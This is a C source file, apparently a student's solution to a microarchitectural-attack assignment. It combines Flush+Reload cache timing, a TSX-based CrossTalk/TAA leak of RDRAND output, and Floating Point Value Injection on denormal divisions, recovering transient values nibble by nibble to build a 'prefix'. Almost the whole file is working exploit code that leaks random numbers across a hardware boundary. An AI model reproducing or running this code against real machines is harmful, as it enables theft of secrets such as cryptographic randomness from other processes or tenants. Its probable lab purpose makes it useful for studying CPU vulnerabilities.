#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <string.h>
#include <x86intrin.h>
#include <stdbool.h>
#include "asm.h"

#define NUM_SAMPLES 10000
#define ROUNDS 100

#define CROSSTALK_STRIDE 2048
#define CROSSTALK_POSSIBLE_BYTES 256
#define CROSSTALK_BYTES_TO_LEAK 8
#define RDRAND_OFFSET 32
#define RDRAND_TO_LEAK 4
#define CROSSTALK_CONFIDENCE 2
#define CROSSTALK_TRIES 5
#define CROSSTALK_SIMILARITY 3
#define CROSSTALK_CONSECUTIVE_HITS 2
// #define CROSSTALK_CONSECUTIVE_NULL_MULTIPLIER 3
// #define CROSSTALK_MAX_NULL 3

// fpvi definitions
#define MAX_NIBBLE_INDEX 16
#define NIBBLE_STRIDE 2048
#define NIBBLE_CONFIDENCE 5
#define NIBBLE_TRIES 20


uint64_t measure_access(unsigned char* addr, int is_miss) {
    uint64_t min_time = UINT64_MAX;

    for(int i = 0; i < ROUNDS; ++i) {
        if(is_miss) {
            clflush(addr);
        } else {
            *(volatile char*)addr; 
        }
        mfence();

        uint64_t start = rdtscp();
        *(volatile char*)addr;
        lfence();
        uint64_t end = rdtscp();

        uint64_t delta_t = end - start;
        if(delta_t < min_time) {
            min_time = delta_t;
        }
    }

    return min_time;
}

uint64_t get_cache_threshold(){

    uint64_t hits = 0;
    uint64_t misses = 0;
    uint64_t delta_t;

    unsigned char test_line[64];
    test_line[0] = 1;

    //HITS
    *(volatile char*)test_line;
    mfence();

    for(int i = 0; i < NUM_SAMPLES; ++i) {
        delta_t =measure_access(test_line, 0);
        hits += delta_t;
    }

    //MISSES
    clflush(test_line);
    mfence();

    for(int i = 0; i < NUM_SAMPLES; ++i) {
        delta_t=  measure_access(test_line, 1);
        misses += delta_t;
    }

    uint64_t hitt_avg = hits / NUM_SAMPLES;
    uint64_t miss_avg = misses / NUM_SAMPLES;
    uint64_t threshold = (miss_avg + hitt_avg) / 2;

    return threshold;
}

uint64_t get_reload_time(unsigned char *addr) {

    mfence();
    uint64_t start = rdtscp();
    *(volatile char*)addr;
    lfence();
    uint64_t end = rdtscp();

    uint64_t delta_t = end - start;

    return delta_t;
}

void reload_and_measure(unsigned char *reloadbuffer, size_t stride, size_t *cache_hits, size_t cache_size, uint64_t threshold) {
    for(int i = 0; i < cache_size; ++i) {
        mfence();
        uint64_t start = rdtscp();
        *(volatile char*)(&reloadbuffer[i * stride]);
        lfence();
        uint64_t end = rdtscp();

        uint64_t reload_time = end - start;
        if(reload_time < threshold) {
            cache_hits[i]++;
        }
    }
}

uint64_t leak_new_rdrand(uint64_t old_rdrand, uint8_t* leak_buffer, uint8_t* reload_buffer, uint64_t CACHE_THRESHOLD)
{
    size_t consecutive_hits = 0;
    uint64_t result = 0;

    while (1) {
        // uint8_t similarity = 0;
        uint64_t last_result = result;

        for (int byte_index = RDRAND_OFFSET; byte_index < RDRAND_OFFSET + CROSSTALK_BYTES_TO_LEAK; ++byte_index) {
            size_t cache_hits[CROSSTALK_POSSIBLE_BYTES] = {0};

            for (int i = 0; i < CROSSTALK_TRIES; ++i) {
                for (int j = 0; j < CROSSTALK_POSSIBLE_BYTES; ++j) {
                    clflush(&reload_buffer[j * CROSSTALK_STRIDE]);
                }

                clflush(leak_buffer + byte_index);
                sfence();
                clflush(reload_buffer); // Necessary to cause TAA

                if (_xbegin() == _XBEGIN_STARTED)
                {
                    size_t index = *(leak_buffer + byte_index) * CROSSTALK_STRIDE; // This should use the data in the LFB transiently.
                    *(volatile char*)(reload_buffer + index);

                    _xend();
                }

                reload_and_measure(reload_buffer, CROSSTALK_STRIDE, cache_hits, CROSSTALK_POSSIBLE_BYTES, CACHE_THRESHOLD);
            }

            uint8_t byte = 0;
            size_t max_hits = 0;
            for(int i = 1; i < 256; ++i) {
                int hits = cache_hits[i];

                if(hits > CROSSTALK_CONFIDENCE) {
                    byte = i;
                    break;
                }

                if(hits > max_hits) {
                    byte = i;
                    max_hits = hits;
                }
            }

            // uint8_t old_byte = old_rdrand >> ((byte_index - RDRAND_OFFSET) * 8) & 0xFF;
            // if (byte == old_byte) {
            //     ++similarity;
            // }

            result = result << 8 | byte;
        }

        if (result != last_result) {
            consecutive_hits = 0;
            continue;
        }

        ++consecutive_hits;

        // int null_bytes = 0;
        int similarity = 0;
        for (int i = 0; i < CROSSTALK_BYTES_TO_LEAK; ++i) {
            // if (((result >> (i * 8)) & 0xFF) == 0) {
            //     ++null_bytes;
            // }

            if (((result >> (i * 8)) & 0xFF) == ((old_rdrand >> (i * 8)) & 0xFF)) {
                ++similarity;
            }
        }

        // Leak the same value consecutively to ensure correctness
        //// Increase required consecutive hits for the number of null bytes found
        //// As null bytes can be the result, when the reload buffer has zero hits
        if (consecutive_hits < CROSSTALK_CONSECUTIVE_HITS) {
            //  + null_bytes * CROSSTALK_CONSECUTIVE_NULL_MULTIPLIER) {
            continue;
        }

        // if (null_bytes > CROSSTALK_MAX_NULL) {
        //     consecutive_hits = 0;
        //     continue;
        // }

        // Check that result is different enough from old_rdrand
        if (similarity < CROSSTALK_SIMILARITY) {
            return result;
        }
    }
}

uint64_t make_denormal(uint64_t val) {
    return val & 0x000FFFFFFFFFFFFFULL;
}

void fpvi_nibble(uint64_t lhs, uint64_t rhs, unsigned char *reloadbuffer, uint8_t nibble_index)
{
    asm volatile(
        ".rept 2                    \n\t"
        "  movq  %[lhs], %%xmm0     \n\t"
        "  movq  %[rhs], %%xmm1     \n\t"
        "  divsd %%xmm1, %%xmm0     \n\t"
        ".endr                      \n\t"
        "movq %%xmm0, %%rax         \n\t"
        "mov  %[shift], %%ecx       \n\t"
        "shrq %%cl, %%rax           \n\t"
        "and  $0xf, %%rax           \n\t"  // 4 bits for nibble
        "shl  $11, %%rax            \n\t"  // STRIDE shift to calculate cache offset
        "add  %[buf], %%rax         \n\t"
        "movb (%%rax), %%al         \n\t"  //access to bring into cache
        :
        : [lhs]"m"(lhs),
            [rhs]"m"(rhs),
            [buf]"r"(reloadbuffer),
            [shift]"r"(nibble_index * 4)
        : "rax","rcx","xmm0","xmm1","memory"
    );
}

uint64_t get_transient_result(uint64_t lhs, uint64_t rhs, uint64_t CACHE_THRESHOLD) {
    unsigned char *reloadbuffer = mmap(NULL, MAX_NIBBLE_INDEX * NIBBLE_STRIDE, PROT_READ | PROT_WRITE,
        MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);
    memset(reloadbuffer, 0, MAX_NIBBLE_INDEX * NIBBLE_STRIDE);

    // get architectural result for
    double result = ((double)lhs) / ((double)rhs);
    uint64_t architectural_result;
    memcpy(&architectural_result, &result, sizeof(architectural_result));

    // Recover transient result nibble by nibble
    uint64_t transient_result = 0;

    for (int nibble_index = 0; nibble_index < MAX_NIBBLE_INDEX; ++nibble_index) {
        size_t cache_hits[MAX_NIBBLE_INDEX] = {0};

        for (int i = 0; i < NIBBLE_TRIES; ++i) {
            for (int j = 0; j < MAX_NIBBLE_INDEX; ++j) {
                clflush(&reloadbuffer[j * NIBBLE_STRIDE]);
            }
            mfence();

            fpvi_nibble(lhs, rhs, reloadbuffer, nibble_index);

            reload_and_measure(reloadbuffer, NIBBLE_STRIDE, cache_hits, MAX_NIBBLE_INDEX, CACHE_THRESHOLD);
        }

        uint8_t architectural_nibble = (architectural_result >> (nibble_index * 4)) & 0xf;
        uint8_t transient_nibble = architectural_nibble;

        //get the most hit that is not the architectural one 
        for(int i = 0; i < MAX_NIBBLE_INDEX; ++i) { // exclude the correct cache hit we are not interested in teh architectural one
            if(cache_hits[i] > NIBBLE_CONFIDENCE && i != architectural_nibble) {
                transient_nibble = i;
                break;
            }
        }
        
        //to reconstruct the transient result
        transient_result |= ((uint64_t)transient_nibble) << (nibble_index * 4);
    }

    munmap(reloadbuffer, MAX_NIBBLE_INDEX * NIBBLE_STRIDE);

    return transient_result;
}

int main(void) {
    // uint64_t old_rdrand;
    // asm volatile("rdrand %%rax" : "=a"(old_rdrand));
    // printf("Old rdrand value: 0x%016lx\n", old_rdrand);

    uint64_t const CACHE_THRESHOLD = get_cache_threshold() * 0.7;
    printf("Cache threshold: %lu\n", CACHE_THRESHOLD);

    // so they can run on the two hyperthreads of the attacker's physical core
    // child and parent will get randomly assigned to 1 of the 2 params passed taskset -c 1,5
    pid_t pid = fork();

    // child CPID loop
    if (pid == 0) {

        while(1) {
            cpuid();  //not sure if it's the corerct assembly from asm.h it was there from asg 1, might need changes not sure yet
        }
        _exit(0);
    }

    // Setup necessary buffers
    size_t const mmap_prot = PROT_READ | PROT_WRITE;
    size_t const mmap_flags = MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_HUGETLB;

    uint8_t *crosstalk_leak = mmap(NULL, CROSSTALK_POSSIBLE_BYTES * CROSSTALK_STRIDE, mmap_prot, mmap_flags, -1, 0);
    if (crosstalk_leak == MAP_FAILED) { perror("mmap crosstalk_leak"); return 1; }

    uint8_t *crosstalk_reloadbuffer = mmap(NULL, CROSSTALK_POSSIBLE_BYTES * CROSSTALK_STRIDE, mmap_prot, mmap_flags, -1, 0);
    if (crosstalk_reloadbuffer == MAP_FAILED) { perror("mmap reloadbuffer"); return 1; }

    uint64_t old_rdrand = leak_new_rdrand(0, crosstalk_leak, crosstalk_reloadbuffer, CACHE_THRESHOLD);

    // Leak rdrand values
    uint64_t leaked_rdrand[RDRAND_TO_LEAK] = {0};
    for (int i = 0; i < RDRAND_TO_LEAK; ++i) {
        uint64_t new_rdrand = leak_new_rdrand(old_rdrand, crosstalk_leak, crosstalk_reloadbuffer, CACHE_THRESHOLD);

        leaked_rdrand[i] = new_rdrand;
        printf("Leaked rdrand value %d: 0x%016lx\n", i, leaked_rdrand[i]);

        old_rdrand = new_rdrand;
    }

    // for (int i = 0; i < RDRAND_TO_LEAK; ++i) {
    //     printf("Leaked rdrand value %d: 0x%016lx\n", i, leaked_rdrand[i]);
    // }

    // FPVI on leaked rdrand values
    uint64_t fpvi_results[RDRAND_TO_LEAK / 2] = {0};

    for (int i = 0; i < RDRAND_TO_LEAK / 2; ++i) {
        uint64_t dlhs = make_denormal(leaked_rdrand[2 * i]);
        uint64_t drhs = make_denormal(leaked_rdrand[2 * i + 1]);

        printf("Denormalized lhs (i: %d): 0x%016lx\n", 2 * i, dlhs);
        printf("Denormalized rhs (i: %d): 0x%016lx\n", 2 * i + 1, drhs);

        fpvi_results[i] = get_transient_result(dlhs, drhs, CACHE_THRESHOLD);
    }

    for (int i = 0; i < RDRAND_TO_LEAK / 2; ++i) {
        printf("FPVI transient result %d: 0x%016lx\n", i, fpvi_results[i]);
    }

    // Concatenate results to form prefix
    char prefix[36] = {0};
    snprintf(prefix, sizeof(prefix), "%016lx%016lx", fpvi_results[0], fpvi_results[1]);

    printf("Prefix: %s\n", prefix);

    kill(pid, SIGKILL);
    waitpid(pid, NULL, 0);

    return 0;
}
